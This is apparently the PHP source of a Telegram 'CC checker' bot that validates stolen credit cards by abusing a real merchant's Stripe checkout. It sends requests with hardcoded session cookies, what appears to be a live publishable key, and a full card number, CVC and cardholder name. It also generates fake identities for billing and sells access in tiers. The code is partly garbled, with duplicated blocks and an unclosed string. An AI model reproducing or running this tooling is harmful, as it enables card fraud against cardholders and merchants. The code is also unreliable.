<?php
//=========RANK DETERMINE=========//
$currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else { 
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); //
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; // add to free users list
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else    $currentDate = date('Y-m-d');
    $rank = "FREE";
    $expiryDate = "0";

    $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
    $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
    $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

    if(in_array($userId, $owners)) {
        $rank = "OWNER";
       $expiryDate = "UNTIL DEAD"; 
    } else {
        foreach ($paidUsers as $index => $line) {
            list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
            if ($userIdFromFile == $userId) {
                if ($userExpiryDate < $currentDate) {
                    unset($paidUsers[$index]); 
                    file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                    $freeUsers[] = $userId; 
                    file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                } else {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    } {
                    $rank = "PAID";
                    $expiryDate = $userExpiryDate;
                }
            }
        }
    }
//=======RANK DETERMINE END=========//
$update = json_decode(file_get_contents("php://input"), TRUE);
$text = $update["message"]["text"];
//========WHO CAN CHECK FUNC========//

//=====WHO CAN CHECK FUNC END======//
if (preg_match('/^(\/au|\.au|!au)/', $text)) {
    $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username 𝘕𝘖 𝘌𝘙𝘌𝘚 𝘗𝘙𝘌𝘔𝘐𝘜𝘔❌</b>", $message_id);
      exit();
    }
$start_time = microtime(true);

  $chatId = $update["message"]["chat"]["id"];
    $message_id = $update["message"]["message_id"];
    $keyboard = "";

//=======WHO CAN CHECK END========//

//====ANTISPAM AND WRONG FORMAT====//
    if (strlen($message) <= 4) {
            sendMessage($chatId, '<b>• 𝘍𝘰𝘳𝘮𝘢𝘵𝘰 𝘪𝘯𝘤𝘰𝘳𝘳𝘦𝘤𝘵𝘰! ⚠️</b>%0A• 𝘜𝘚𝘖 <code>/au cc|mm|yy|cvv</code>%0A• 𝘎𝘢𝘵𝘦𝘸𝘢𝘺 <code>Stripe Auth</code>', $message_id);
            exit();
  }
$r = "0";

$r = rand(0, 100);
//==ANTISPAM AND WRONG FORMAT END==//



//==ANTISPAM AND WRONG FORMAT END==//


//=======checker part start========//
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}


$lista = substr($message, 5);
$separa = explode("|", $lista);
$cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
$mes = isset($separa[1]) ? $separa[1] : '';
$ano = isset($separa[2]) ? $separa[2] : '';
$cvv = isset($separa[3]) ? $separa[3] : '';


$last4 = substr($cc, -4);


$sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>

━━━━━━━━━━━━━━━━━━
[†] ᴄᴀʀᴅ ★ <code>$lista</code>
[†] sᴛᴀᴛᴜs ★ ■□□□□ 20%🟣
[†] ʀᴇsᴘᴏɴsᴇ ★  2001 Insufficient Funds?
━━━━━━━━━━━━━━━━━━
➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz
━━━━━━━━━━━━━━━━━━</b>");

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
//================[Functions and Variables]================//
#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

#------[CC Type Randomizer]------#

 $cardNames = array(
    "3" => "American Express",
    "4" => "Visa",
    "5" => "MasterCard",
    "6" => "Discover"
 );
 $card_type = $cardNames[substr($cc, 0, 1)];




sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[†] ᴄᴀʀᴅ ★ <code>$lista</code>
[†] sᴛᴀᴛᴜs ★ ■■□□□ 40%⚫
[†] ʀᴇsᴘᴏɴsᴇ ★  2001 Insufficient Funds?
━━━━━━━━━━━━━━━━━━
➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz 
━━━━━━━━━━━━━━━━━━</b>");

  //==================[Randomizing Details]======================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$postcode = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$num = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 

//==============[Randomizing Details-END]======================//
sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[†] ᴄᴀʀᴅ ★ <code>$lista</code>
[†] sᴛᴀᴛᴜs ★ ■■■□□ 60%🔴
[†] ʀᴇsᴘᴏɴsᴇ ★ 81724: Duplicate card exists?
━━━━━━━━━
➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz 
━━━━━━━━━━━━━━━━━━</b>");


  //==================[BIN LOOK-UP]======================//

  $bin = substr($lista, 0,6);
  $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'bin='.$bin.'');
$fim = curl_exec($ch);
$bank = GetStr($fim, '"bank":{"name":"', '"');
$name = strtoupper(GetStr($fim, '"name":"', '"'));
$brand = strtoupper(GetStr($fim, '"brand":"', '"'));
$country = strtoupper(GetStr($fim, '"country":{"name":"', '"'));
$scheme = strtoupper(GetStr($fim, '"scheme":"', '"'));
$emoji = GetStr($fim, '"emoji":"', '"');
$type =strtoupper(GetStr($fim, '"type":"', '"'));


//==================[BIN LOOK-UP-END]======================//



sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[†] ᴄᴀʀᴅ ★ <code>$lista</code>
[†] sᴛᴀᴛᴜs ★ ■■■■□ 80%🔴
[†] ʀᴇsᴘᴏɴsᴇ ★ 81724: Duplicate card exists?
━━━━━━━━━
➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz 
━━━━━━━━━━━━━━━━━━</b>");
  # -------------------- [1 REQ] -------------------#
  $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://www.luggagetoship.com/order/ax_charge_order_pay');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "order_id=92095");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Connection: keep-alive';
$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'Cookie: comm100_visitorguid_21799=2e0ddd86-cfd3-4ba6-aaba-196dd44c0ecd; ci_session=3047e0a734155c061ea6e3278dff95abd7bf56c7; __stripe_sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607; __stripe_mid=fd289972-6223-4864-938b-bc44fcc4faf6140118';
$headers[] = 'Origin: https://www.luggagetoship.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://www.luggagetoship.com/order/order_processing/92095';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-origin';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
$headers[] = 'X-Requested-With: XMLHttpRequest';
$headers[] = 'Sec-Ch-Ua: ^^Not_A';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);



    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "time_on_page=697229&pasted_fields=number&guid=119a750e-9494-4efe-b137-e7a49987e99393b097&muid=fd289972-6223-4864-938b-bc44fcc4faf6140118&sid=f30b716b-9429-4ac5-a60f-27d94d1fd539655607&key=pk_live_vDBwegkvQzKsZsPgSnD40s6f&payment_user_agent=stripe.js^%^2F78ef418&card^[number^]=4381086424583789&card^[cvc^]=944&card^[exp_month^]=6&card^[exp_year^]=2027&card^[name^]=Halley+Swann&card^[address_line1^]=15+Driggs+Streets&card^[address_city^]=Driggs&card^[address_zip^]=84342&card^[address_state^]=&card^[address_country^]=AR");
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

$headers = array();
$headers[] = 'Authority: api.stripe.com';
$headers[] = 'Accept: application/json';
$headers[] = 'Accept-Language: en-US';
$headers[] = 'Cache-Control: no-cache';
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
$headers[] = 'Origin: https://js.stripe.com';
$headers[] = 'Pragma: no-cache';
$headers[] = 'Referer: https://js.stripe.com/';
$headers[] = 'Sec-Ch-Ua: ^^Not_A';
$headers[] = 'Sec-Ch-Ua-Mobile: ?0';
$headers[] = 'Sec-Ch-Ua-Platform: ^^Windows^^\"\"';
$headers[] = 'Sec-Fetch-Dest: empty';
$headers[] = 'Sec-Fetch-Mode: cors';
$headers[] = 'Sec-Fetch-Site: same-site';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $result2 = curl_exec($ch);
      $msg2 = Getstr($result2,'"message": "','"');

    $end_time = microtime(true);
  $time = number_format($end_time - $start_time, 2);
    

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>

━━━━━━━━━━━━━━━━━━
[†] ᴄᴀʀᴅ ★ <code>$lista</code>
[†] sᴛᴀᴛᴜs ★ ■■■■■ 99%🟢
[†] ʀᴇsᴘᴏɴsᴇ ★ 81724: Duplicate card exists?
━━━━━━━━━
➜ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 @$username/<code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz 
━━━━━━━━━━━━━━━━━━</b>");
$end_time = microtime(true);
$time = number_format($end_time - $start_time, 2);

  //======checker part end=========//

  $resp = "<b>
    
    ////////--[Responses]--////////

      if(strpos($result2, '"status": "succeeded"' )) {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
━━━━━━━━━━━━━━━━           
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
[†] ʀᴇsᴘᴏɴsᴇ <code> CVV LIVE </code>
━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand</code>
[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
━━━━━━━━━━━━━━━━
[†] 𝗧𝗶𝗺𝗲 <code> $time seconds </code>
[†] 𝗣𝗿𝗼𝘅𝘆 <code>$r.XXX.XXX.XX </code>
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬  @hexnynejz
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
      elseif((empty($client)) || (empty($pi))) {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
  ━━━━━━━━━━━━━━━━            
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs Stripe Auth $1
[†] ʀᴇsᴘᴏɴsᴇ $msg 81724: Duplicate card exists in the vault. 
  ━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: $bank
[†] 𝙏𝙮𝙥𝙚: $bin
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: $name $emoji
  ━━━━━━━━━━━━━━━━
[†] 𝗣𝗿𝗼𝘅𝘆 ⇾ 𝗟𝗶𝘃𝗲  
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺
  </a>━━━━━━━━━━━━━━━━
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
      else {
          bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌
━━━━━━━━━━━━━━━━      
[†] ᴄᴀʀᴅ <code>$lista</code>
[†] sᴛᴀᴛᴜs <code>Stripe Auth $1</code>
[†] ʀᴇsᴘᴏɴsᴇ <code>. $msg2 $bin </code>
━━━━━━━━━━━━━━━━
[†] 𝘽𝘼𝙉𝙆: <code>$bank $brand </code>
[†] 𝘽𝙧𝙖𝙣𝙙: <code>$scheme </code>
[†] 𝘾𝙊𝙐𝙉𝙏𝙍𝙔: <code>$name $emoji</code>
━━━━━━━━━━━━━━━━
[†] 𝗧𝗶𝗺𝗲 : <code>$time seconds </code>
[†] 𝗣𝗿𝗼𝘅𝘆: <code>$r.XXX.XXX.XX </code>
[†] 𝗨𝘀𝗲𝗿 @$username <code>[$rank]</code>
『 𝗕𝗢𝗧 𝗕𝗬 <a href='t.me/hexnynejz'> 🅷🅴🆇🅽🆈🅽🅴🅲🅷🅺 </a>
━━━━━━━━━━━━━━━━
  ",
              'parse_mode'=>'html',
              'disable_web_page_preview'=>'true'
              ]);
      }
  }
  ?>
